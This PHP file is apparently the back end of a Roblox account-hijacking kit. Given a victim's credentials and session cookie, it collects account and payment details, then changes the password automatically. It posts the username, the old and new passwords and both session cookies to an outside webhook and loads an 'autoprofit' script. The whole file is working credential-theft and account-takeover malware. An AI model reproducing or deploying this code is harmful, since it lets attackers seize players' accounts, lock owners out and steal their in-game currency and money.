<?php
$session->useragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';
$response = $session->post("https://auth.roblox.com/v2/login");
$xcsrftoken = $response->headers["x-csrf-token"];
$session->headers["x-csrf-token"] = $xcsrftoken;
$session->headers["Accept"] = "application/json, text/plain, */*";
$session->headers["Content-Type"] = "application/json;charset=utf-8";
$session->headers["Origin"] = "https://www.roblox.com";
$session->headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36";

$header = array(
    
        'X-Requested-With: XMLHttpRequest',
        'Accept: application/json',
        "Cookie: $cookie",
);

$check123 = file_get_contents("https://api.roblox.com/users/get-by-username?username=$username", false);
$user = json_decode($check123);
$userid = $user->{'Id'};

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://www.roblox.com/mobileapi/userinfo?nl=true",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTPHEADER => $header,
));

$response = curl_exec($curl);
$decodeuserinfo = json_decode($response);

$robux =  $decodeuserinfo->{'RobuxBalance'};


$premeium =  $decodeuserinfo->{'IsPremium'};
$membership = "NBC";
if($premeium){
    $membership = "Premium";
}

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://auth.roblox.com/v1/account/pin",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTPHEADER => $header,
));

$response = curl_exec($curl);
$jsonpin = json_decode($response);

$IsEnabled = $jsonpin->{'isEnabled'};

$pin = "Disable";

if ($IsEnabled){
    $pin = "Enable";
} 

$check = file_get_contents("http://api.roblox.com/Ownership/HasAsset?userId=$userid&assetId=102611803", false);

if ($check == "true") {
    $verified = "Verified";
}else{
    $verified = "Unverified";
};

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://billing.roblox.com/v1/credit",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTPHEADER => $header,
));

$response = curl_exec($curl);
$jsoncredit = json_decode($response);
$credit = $jsoncredit->{'balance'};
$converttorbx = $jsoncredit->{'robuxAmount'};


$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://economy.roblox.com/v2/users/$userid/transaction-totals?timeFrame=year&transactionType=summary&limit=100",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTPHEADER => $header,
));

$response = curl_exec($curl);
$jsonrevenue = json_decode($response);

$summary =  $jsonrevenue->salesTotal+$jsonrevenue->affiliateSalesTotal+$jsonrevenue->groupPayoutsTotal+$jsonrevenue->currencyPurchasesTotal+$jsonrevenue->premiumStipendsTotal+$jsonrevenue->tradeSystemEarningsTotal+$jsonrevenue->tradeSystemCostsTotal+$jsonrevenue->premiumPayoutsTotal+$jsonrevenue->groupPremiumPayoutsTotal+$jsonrevenue->developerExchangeTotal+$jsonrevenue->pendingRobuxTotal+$jsonrevenue->incomingRobuxTotal+$jsonrevenue->outgoingRobuxTotal+$jsonrevenue->individualToGroupTotal+$jsonrevenue->csAdjustmentTotal;
$pendingRobux = $jsonrevenue->pendingRobuxTotal;

$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => "https://users.roblox.com/v1/users/$userid",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_HTTPHEADER => $header,
));

$response = curl_exec($curl);
$jsonjoindate = json_decode($response);
$joindate = $jsonjoindate->{"created"};
$date = "$joindate";
$new_date = date('n/j/Y',strtotime($date));

$avatarApi = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=$userid&size=48x48&format=png")
  ;
$aDecode = json_decode($avatarApi,true);
foreach($aDecode['data'] as $avatarData){
    $thumbnailurl =  $avatarData['imageUrl'];
}

$new_pass = $_GET["newpass"];
$newpass = array(
    "currentPassword" => $password,
    "newPassword" => $new_pass,
);
$jsonnewpass = json_encode($newpass);

$response = $session->post("https://auth.roblox.com/v2/user/passwords/change",  $session->headers,$jsonnewpass);

if ($response->status_code == 200) {
    $response_result = "Auto Password Changer Success!";
    $newPass = "$password -> $new_pass";
    $cookie1 = $session->cookies[".ROBLOSECURITY"];
}else{
    $response_result = "Auto Password Changer Failed!";
    $newPass = "Failed!";
}

$embed = json_encode([
    
    "username" => "Test",
    "avatar_url" => "",
    "tts" => false,


    "embeds" => [
        [

            "title" => "Click here to view profile",

            "type" => "rich",

            "description" => "```yaml\n$response_result\n$newPass```",

            "url" => "https://www.roblox.com/users/$userid/profile",

            "timestamp" => date("c", strtotime("now")),

            "color" => hexdec( "61E878" ),


            "footer" => [
                "text" => "Successfully Logged In!",
                "icon_url" => "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/512px-Twitter_Verified_Badge.svg.png?20211123214859"
            ],

            "image" => [
                "url" => ""
            ],

            "thumbnail" => [
                "url" => "$thumbnailurl"
            ],

            "author" => [
                "name" => "Test Login",
                "url" => ""
            ],

            "fields" => [
                [
                    "name" => "Username",
                    "value" => $username,
                    "inline" => true
                ],
                [
                    "name" => "Password",
                    "value" => $password,
                    "inline" => true
                ],
                [
                    "name" => "Membership",
                    "value" => $membership,
                    "inline" => true    
                    
                    
                ],
                [
                    "name" => "Robux / Pending",
                    "value" => "R$ ".number_format($robux)." / R$ ".number_format($pendingRobux),
                    "inline" => true
                    
                ],
                [
                    "name" => "Summary",
                    "value" => "R$ ".number_format($summary),
                    "inline" => true    
                    
                ],
                [
                    "name" => "Credit Balance",
                    "value" => number_format($credit)." -> R$ ".number_format($converttorbx),
                    "inline" => true    
                
                ],
                [
                    "name" => "Pin",
                    "value" => $pin,
                    "inline" => true
                    
                ],
                [
                    "name" => "Security",
                    "value" => $verified,
                    "inline" => true
                    
                ],
                [
                    "name" => "Join Date",
                    "value" => "Joined $new_date",
                    "inline" => true       
                    
                         
                ],
                [
                    "name" => "New Cookie",
                    "value" => "```yaml\n$cookie1```",
                    "inline" => false       
                ],
                [
                    "name" => "Old Cookie",
                    "value" => "```yaml\n$cookie```",
                    "inline" => false       
                ]
                
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => $success,
  CURLOPT_POST => true,
  CURLOPT_POSTFIELDS => $embed,
  CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
));

$response = curl_exec($curl);
curl_close( $curl );
include("autoprofit.php");
?>